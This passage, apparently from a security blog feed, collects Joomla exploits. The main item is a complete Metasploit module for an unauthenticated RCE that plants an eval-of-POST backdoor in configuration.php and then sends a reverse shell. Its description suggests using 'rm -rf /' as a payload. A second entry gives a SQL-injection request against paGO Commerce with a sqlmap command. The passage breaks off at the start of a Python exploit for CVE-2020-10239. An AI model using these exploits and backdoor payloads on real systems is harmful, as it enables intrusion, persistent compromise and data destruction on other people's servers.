class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MetasploitModule</span> &lt; Msf::Exploit::<span class="title">Remote</span></span></span><br><span class="line">  Rank = ExcellentRanking</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> Msf::Exploit::Remote::HTTP::Joomla</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(info = &#123;&#125;)</span></span></span><br><span class="line">    <span class="keyword">super</span>(update_info(info,</span><br><span class="line">      <span class="string">'Name'</span>           =&gt; <span class="string">'Rusty Joomla Unauthenticated Remote Code Execution'</span>,</span><br><span class="line">      <span class="string">'Description'</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">PHP Object Injection because of a downsize in the read/write process with the database leads to RCE.</span></span><br><span class="line"><span class="string">The exploit will backdoor the configuration.php file in the root directory with en eval of a POST parameter.</span></span><br><span class="line"><span class="string">That's because the exploit is more reliabale (doesn't rely on common disabled function). </span></span><br><span class="line"><span class="string">For this reason, use it with caution and remember the house cleaning.</span></span><br><span class="line"><span class="string">Btw, you can also edit this exploit and use whatever payload you want. just modify the exploit object with </span></span><br><span class="line"><span class="string">get_payload('you_php_function','your_parameters'), e.g. get_payload('system','rm -rf /') and enjoy</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">'Author'</span>=&gt;</span><br><span class="line">        [</span><br><span class="line">          <span class="string">'Alessandro \'kiks\' Groppo @Hacktive Security'</span>, </span><br><span class="line">        ],</span><br><span class="line">      <span class="string">'License'</span>        =&gt; MSF_LICENSE,</span><br><span class="line">      <span class="string">'References'</span>     =&gt;</span><br><span class="line">        [</span><br><span class="line">[<span class="string">'URL'</span>, <span class="string">'https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41'</span>]</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">'Privileged'</span>     =&gt; <span class="literal">false</span>, </span><br><span class="line">      <span class="string">'Platform'</span>       =&gt; <span class="string">'PHP'</span>,</span><br><span class="line">      <span class="string">'Arch'</span>           =&gt; ARCH_PHP,</span><br><span class="line">      <span class="string">'Targets'</span>        =&gt; [[<span class="string">'Joomla 3.0.0 - 3.4.6'</span>, &#123;&#125;]],</span><br><span class="line">      <span class="string">'DisclosureDate'</span> =&gt; <span class="string">'Oct 02  2019'</span>,</span><br><span class="line">      <span class="string">'DefaultTarget'</span>  =&gt; <span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    register_advanced_options(</span><br><span class="line">      [</span><br><span class="line">        OptBool.new(<span class="string">'FORCE'</span>, [<span class="literal">true</span>, <span class="string">'Force run even if check reports the service is safe.'</span>, <span class="literal">false</span>]),</span><br><span class="line">      ])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_random_string</span><span class="params">(length=<span class="number">50</span>)</span></span></span><br><span class="line">  source=(<span class="string">"a"</span>..<span class="string">"z"</span>).to_a + (<span class="string">"A"</span>..<span class="string">"Z"</span>).to_a + (<span class="number">0</span>..<span class="number">9</span>).to_a </span><br><span class="line">key=<span class="string">""</span></span><br><span class="line">length.times&#123; key += source[rand(source.size)].to_s &#125;</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_session_token</span></span></span><br><span class="line"><span class="comment"># Get session token from cookies</span></span><br><span class="line">vprint_status(<span class="string">'Getting Session Token'</span>)</span><br><span class="line">res = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line"><span class="string">'uri'</span>  =&gt; normalize_uri(target_uri.path) </span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">cook = res.headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">';'</span>)[<span class="number">0</span>]</span><br><span class="line">vprint_status(<span class="string">'Session cookie: '</span> + cook)</span><br><span class="line"><span class="keyword">return</span> cook</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_csrf_token</span><span class="params">(sess_cookie)</span></span></span><br><span class="line">  vprint_status(<span class="string">'Getting CSRF Token'</span>)</span><br><span class="line"></span><br><span class="line">  res = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line"><span class="string">'uri'</span> =&gt; normalize_uri(target_uri.path,<span class="string">'/index.php/component/users'</span>),</span><br><span class="line"><span class="string">'headers'</span> =&gt; &#123;</span><br><span class="line"><span class="string">'Cookie'</span> =&gt; sess_cookie,</span><br><span class="line">&#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  html = res.get_html_document</span><br><span class="line">  input_field = html.at(<span class="string">'//form'</span>).xpath(<span class="string">'//input'</span>)[-<span class="number">1</span>]</span><br><span class="line">  token = input_field.to_s.split(<span class="string">' '</span>)[<span class="number">2</span>]</span><br><span class="line">  token = token.gsub(<span class="string">'name="'</span>,<span class="string">''</span>).gsub(<span class="string">'"'</span>,<span class="string">''</span>)</span><br><span class="line">  <span class="keyword">if</span> token <span class="keyword">then</span></span><br><span class="line">  vprint_status(<span class="string">'CSRF Token: '</span> + token)</span><br><span class="line">  <span class="keyword">return</span> token</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  print_error(<span class="string">'Cannot get the CSRF Token ..'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_payload</span><span class="params">(function, payload)</span></span></span><br><span class="line">  <span class="comment"># <span class="doctag">@function</span>: The PHP Function</span></span><br><span class="line">  <span class="comment"># <span class="doctag">@payload</span>: The payload for the call</span></span><br><span class="line">  template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line">  <span class="comment"># The http:// part is necessary in order to validate a condition in SimplePie::init and trigger the call_user_func with arbitrary values</span></span><br><span class="line">  payload = <span class="string">'http://l4m3rz.l337/;'</span> + payload</span><br><span class="line">  final = template.gsub(<span class="string">'PAYLOAD'</span>,payload).gsub(<span class="string">'LENGTH'</span>, payload.length.to_s).gsub(<span class="string">'FUNC_NAME'</span>, function).gsub(<span class="string">'FUNC_LEN'</span>, function.length.to_s)</span><br><span class="line">  <span class="keyword">return</span> final</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get_payload_backdoor</span><span class="params">(param_name)</span></span> </span><br><span class="line"><span class="comment"># return the backdoor payload</span></span><br><span class="line"><span class="comment"># or better, the payload that will inject and eval function in configuration.php (in the root)</span></span><br><span class="line"><span class="comment"># As said in other part of the code. we cannot create new .php file because we cannot use </span></span><br><span class="line"><span class="comment"># the ? character because of the check on URI schema</span></span><br><span class="line">function = <span class="string">'assert'</span></span><br><span class="line">        template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span>                                                             </span><br><span class="line">        <span class="comment"># This payload will append an eval() at the end of the configuration file                                                                            </span></span><br><span class="line">        payload =  <span class="string">"file_put_contents('configuration.php','if(isset($_POST[\\'"</span>+param_name+<span class="string">"\\'])) eval($_POST[\\'"</span>+param_name+<span class="string">"\\']);', FILE_APPEND) || $a=\'http://wtf\';"</span></span><br><span class="line">template[<span class="string">'PAYLOAD'</span>]  = payload </span><br><span class="line">template[<span class="string">'LENGTH'</span>]   = payload.length.to_s</span><br><span class="line">template[<span class="string">'FUNC_NAME'</span>] = function </span><br><span class="line">template[<span class="string">'FUNC_LEN'</span>] = function.length.to_s</span><br><span class="line">        <span class="keyword">return</span> template </span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_by_exploiting</span></span></span><br><span class="line">    <span class="comment"># Check that is vulnerable by exploiting it and try to inject a printr('something')</span></span><br><span class="line">    <span class="comment"># Get the Session anb CidSRF Tokens</span></span><br><span class="line">    sess_token = get_session_token()</span><br><span class="line">    csrf_token = get_csrf_token(sess_token)</span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">'Testing with a POC object payload'</span>)</span><br><span class="line"></span><br><span class="line">    username_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">    password_payload = <span class="string">'AAA";'</span><span class="comment"># close the prev object</span></span><br><span class="line">    password_payload += get_payload(<span class="string">'print_r'</span>,<span class="string">'IAMSODAMNVULNERABLE'</span>)<span class="comment"># actual payload </span></span><br><span class="line">    password_payload += <span class="string">'s:6:"return":s:102:'</span> <span class="comment"># close cleanly the object</span></span><br><span class="line">    res = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'uri'</span>   =&gt; normalize_uri(target_uri.path,<span class="string">'/index.php/component/users'</span>),</span><br><span class="line"><span class="string">'method'</span>   =&gt; <span class="string">'POST'</span>,</span><br><span class="line"><span class="string">'headers'</span>  =&gt; </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">'Cookie'</span> =&gt; sess_token,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">'vars_post'</span> =&gt; &#123;</span><br><span class="line"><span class="string">'username'</span> =&gt; username_payload,</span><br><span class="line"><span class="string">'password'</span> =&gt; password_payload,</span><br><span class="line"><span class="string">'option'</span>   =&gt; <span class="string">'com_users'</span>,</span><br><span class="line"><span class="string">'task'</span>   =&gt; <span class="string">'user.login'</span>,</span><br><span class="line">csrf_token =&gt; <span class="string">'1'</span>,</span><br><span class="line">&#125;</span><br><span class="line">    &#125;) </span><br><span class="line">    <span class="comment"># Redirect in order to retrieve the output</span></span><br><span class="line">    <span class="keyword">if</span> res.redirection <span class="keyword">then</span></span><br><span class="line">res_redirect = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line"><span class="string">'uri'</span> =&gt; res.redirection.to_s,</span><br><span class="line"><span class="string">'headers'</span> =&gt;&#123;</span><br><span class="line"><span class="string">'Cookie'</span> =&gt; sess_token</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'IAMSODAMNVULNERABLE'</span>.<span class="keyword">in</span>? res.to_s <span class="keyword">or</span> <span class="string">'IAMSODAMNVULNERABLE'</span>.<span class="keyword">in</span>? res_redirect.to_s <span class="keyword">then</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check</span></span></span><br><span class="line">    <span class="comment"># Check if the target is UP and get the current version running by info leak    </span></span><br><span class="line">    res = send_request_cgi(&#123;<span class="string">'uri'</span> =&gt; normalize_uri(target_uri.path, <span class="string">'/administrator/manifests/files/joomla.xml'</span>)&#125;)</span><br><span class="line">    <span class="keyword">unless</span> res</span><br><span class="line">      print_error(<span class="string">"Connection timed out"</span>)</span><br><span class="line">      <span class="keyword">return</span> Exploit::CheckCode::Unknown</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parse XML to get the version </span></span><br><span class="line">    <span class="keyword">if</span> res.code == <span class="number">200</span> <span class="keyword">then</span></span><br><span class="line">    xml = res.get_xml_document</span><br><span class="line">    version = xml.at(<span class="string">'version'</span>).text</span><br><span class="line">    print_status(<span class="string">'Identified version '</span> + version)</span><br><span class="line">    <span class="keyword">if</span> version &lt;= <span class="string">'3.4.6'</span> <span class="keyword">and</span> version &gt;= <span class="string">'3.0.0'</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> check_by_exploiting()</span><br><span class="line"><span class="keyword">return</span> Exploit::CheckCode::Vulnerable</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="keyword">if</span> check_by_exploiting() <span class="keyword">then</span></span><br><span class="line"><span class="comment"># Try the POC 2 times. </span></span><br><span class="line"><span class="keyword">return</span> Exploit::CheckCode::Vulnerable</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> Exploit::CheckCode::Safe</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> Exploit::CheckCode::Safe</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    print_error(<span class="string">'Cannot retrieve XML file for the Joomla Version. Try the POC in order to confirm if it\'s vulnerable'</span>)</span><br><span class="line">    <span class="keyword">if</span> check_by_exploiting() <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> Exploit::CheckCode::Vulnerable</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> check_by_exploiting() <span class="keyword">then</span></span><br><span class="line"><span class="keyword">return</span> Exploit::CheckCode::Vulnerable</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> Exploit::CheckCode::Safe</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">    <span class="keyword">if</span> check == Exploit::CheckCode::Safe &amp;&amp; !datastore[<span class="string">'FORCE'</span>]</span><br><span class="line">      print_error(<span class="string">'Target is not vulnerable'</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pwned = <span class="literal">false</span></span><br><span class="line">    cmd_param_name = get_random_string(<span class="number">50</span>) </span><br><span class="line"></span><br><span class="line">    sess_token = get_session_token()</span><br><span class="line">    csrf_token = get_csrf_token(sess_token)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># In order to avoid problems with disabled functions</span></span><br><span class="line">    <span class="comment"># We are gonna append an eval() function at the end of the configuration.php file</span></span><br><span class="line">    <span class="comment"># This will not cause any problem to Joomla and is a good way to execute then PHP directly</span></span><br><span class="line">    <span class="comment"># cuz assert is toot annoying and with conditions that we have we cannot inject some characters</span></span><br><span class="line">    <span class="comment"># So we will use 'assert' with file_put_contents to append the string. then create a reverse shell with this backdoor</span></span><br><span class="line">    <span class="comment"># Oh i forgot, We cannot create a new file because we cannot use the '?' character in order to be interpreted by the web server.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> Add the PHP payload object to inject the backdoor inside the configuration.php file</span></span><br><span class="line">    <span class="comment"># Use the implanted backdoor to receive a nice little reverse shell with a PHP payload</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Implant the backdoor</span></span><br><span class="line">    vprint_status(<span class="string">'Cooking the exploit ..'</span>)</span><br><span class="line">    username_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">    password_payload = <span class="string">'AAA";'</span><span class="comment"># close the prev object</span></span><br><span class="line">    password_payload += get_payload_backdoor(cmd_param_name)<span class="comment"># actual payload </span></span><br><span class="line">    password_payload += <span class="string">'s:6:"return":s:102:'</span> <span class="comment"># close cleanly the object</span></span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">'Sending exploit ..'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    res = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'uri'</span>   =&gt; normalize_uri(target_uri.path,<span class="string">'/index.php/component/users'</span>),</span><br><span class="line"><span class="string">'method'</span>   =&gt; <span class="string">'POST'</span>,</span><br><span class="line"><span class="string">'headers'</span>  =&gt; &#123;</span><br><span class="line"><span class="string">'Cookie'</span> =&gt; sess_token</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">'vars_post'</span> =&gt; &#123;</span><br><span class="line"><span class="string">'username'</span> =&gt; username_payload,</span><br><span class="line"><span class="string">'password'</span> =&gt; password_payload,</span><br><span class="line"><span class="string">'option'</span>   =&gt; <span class="string">'com_users'</span>,</span><br><span class="line"><span class="string">'task'</span>   =&gt; <span class="string">'user.login'</span>,</span><br><span class="line">csrf_token =&gt; <span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;) </span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">'Triggering the exploit ..'</span>)    </span><br><span class="line">    <span class="keyword">if</span> res.redirection <span class="keyword">then</span></span><br><span class="line">res_redirect = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'method'</span> =&gt; <span class="string">'GET'</span>,</span><br><span class="line"><span class="string">'uri'</span> =&gt; res.redirection.to_s,</span><br><span class="line"><span class="string">'headers'</span> =&gt;&#123;</span><br><span class="line"><span class="string">'Cookie'</span> =&gt; sess_token</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ping the backdoor see if everything is ok :/</span></span><br><span class="line">    res = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'method'</span>     =&gt; <span class="string">'POST'</span>,</span><br><span class="line"><span class="string">'uri'</span>     =&gt; normalize_uri(target_uri.path,<span class="string">'configuration.php'</span>),</span><br><span class="line"><span class="string">'vars_post'</span>  =&gt; &#123;</span><br><span class="line">cmd_param_name  =&gt; <span class="string">'echo \'PWNED\';'</span> </span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">    <span class="keyword">if</span> res.to_s.<span class="keyword">include</span>? <span class="string">'PWNED'</span> <span class="keyword">then</span></span><br><span class="line">print_status(<span class="string">'Target P0WN3D! eval your code at /configuration.php with '</span> + cmd_param_name + <span class="string">' in a POST'</span>)</span><br><span class="line">pwned = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pwned <span class="keyword">then</span></span><br><span class="line">        print_status(<span class="string">'Now it\'s time to reverse shell'</span>)</span><br><span class="line">res = send_request_cgi(&#123;</span><br><span class="line"><span class="string">'method'</span>     =&gt; <span class="string">'POST'</span>,</span><br><span class="line"><span class="string">'uri'</span>     =&gt; normalize_uri(target_uri.path,<span class="string">'configuration.php'</span>),</span><br><span class="line"><span class="string">'vars_post'</span>  =&gt; &#123;</span><br><span class="line">cmd_param_name  =&gt; payload.encoded </span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla!%20paGO%20Commerce%202.5.9.0%20%E5%AD%98%E5%9C%A8SQL%20%E6%B3%A8%E2%BC%8A/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla!%20paGO%20Commerce%202.5.9.0%20%E5%AD%98%E5%9C%A8SQL%20%E6%B3%A8%E2%BC%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="Joomla-paGO-Commerce-2-5-9-0-存在SQL-注⼊"><a href="#Joomla-paGO-Commerce-2-5-9-0-存在SQL-注⼊" class="headerlink" title="Joomla! paGO Commerce 2.5.9.0 存在SQL 注⼊"></a>Joomla! paGO Commerce 2.5.9.0 存在SQL 注⼊</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> POST /joomla/administrator/index.php?option=com_pago&amp;view=comments HTTP/1.1</span><br><span class="line">2 Host: localhost</span><br><span class="line">3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">5 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">6 Accept-Encoding: gzip, deflate</span><br><span class="line">7 Content-Type: application/x-www-form-urlencoded</span><br><span class="line">8 Content-Length: 163</span><br><span class="line">9 Origin: http://localhost</span><br><span class="line">10 Connection: close</span><br><span class="line">11 Referer: http://localhost/joomla/administrator/index.php?option=com_pago&amp;view=comments</span><br><span class="line">12 Cookie: 4bde113dfc9bf88a13de3b5b9eabe495=sp6rp5mqnihh2i323r57cvesoe; crisp-client%2Fsession%2F0</span><br><span class="line">13 Upgrade-Insecure-Requests: 1</span><br><span class="line">14</span><br><span class="line">15 filter_search=&amp;limit=10&amp;filter_published=1&amp;task=&amp;controller=comments&amp;boxchecked=0&amp;filter_order= </span><br><span class="line">​```POC</span><br></pre></td></tr></table></figure><p> sqlmap -r pago –dbs –risk=3 –level=5 –random-agent -p filter_published<br><code>`</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla%20%E6%8E%88%E6%9D%83%20RCE%E6%BC%8F%E6%B4%9E%20%EF%BC%88CVE-2020-11890%20CVE-2020-10238%20CVE-2020-10239%EF%BC%89/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/Joomla%20%E6%8E%88%E6%9D%83%20RCE%E6%BC%8F%E6%B4%9E%20%EF%BC%88CVE-2020-11890%20CVE-2020-10238%20CVE-2020-10239%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#CVE-2020-10239</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import argparse</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def extract_token(resp):</span><br><span class="line">    match = re.search(r&apos;name=&quot;([a-f0-9]&#123;32&#125;)&quot; value=&quot;1&quot;&apos;, resp.text, re.S)</span><br><span class="line">    if match is None:</span><br><span class="line">        print(&quot;[-] Cannot find CSRF token!\n&quot;)</span><br><span class="line">        return None</span><br><span class="line">    return match.group(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def try_admin_login(sess, url, uname, upass):</span><br><span class="line">    admin_url = url + &apos;/administrator/index.php&apos;</span><br><span class="line">    print(&apos;[+] Getting token for Manager login&apos;)</span><br><span class="line">    resp = sess.get(admin_url, verify=True)</span><br><span class="line">    token = 